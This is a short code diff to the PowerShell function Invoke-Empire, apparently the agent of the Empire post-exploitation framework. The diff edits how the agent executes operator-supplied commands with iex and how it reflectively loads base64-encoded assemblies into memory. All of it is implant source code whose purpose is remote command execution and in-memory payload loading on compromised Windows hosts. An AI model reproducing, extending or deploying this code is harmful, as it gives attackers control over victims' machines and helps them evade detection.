@@ -278,9 +278,11 @@ function Invoke-Empire {
                 $OldConsoleOut = [Console]::Out
                 $StringWriter = New-Object IO.StringWriter
                 [Console]::SetOut($StringWriter)
-                #$output = iex "$cmdargs"
-                $output = IEX "$cmdargs"
+                $output = iex "$cmdargs" | out-string
+                #for somereason this was quoted again and it shouldn't need to be
+                #$output = iex $cmdargs
                 [Console]::SetOut($OldConsoleOut)
+
                 if ($output.length -eq 0){
                     $output = $StringWriter.ToString()
                     }
@@ -289,7 +291,8 @@ function Invoke-Empire {
         }
         elseif ($cmd.ToLower() -eq 'reflectiveload'){
             if ($cmdargs.length -eq '') { $output = 'no binary supplied' }
-            else{[System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs))
+            else{
+                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs))
                 $output = "`n`r Reflective Load Complete"
             }
         }
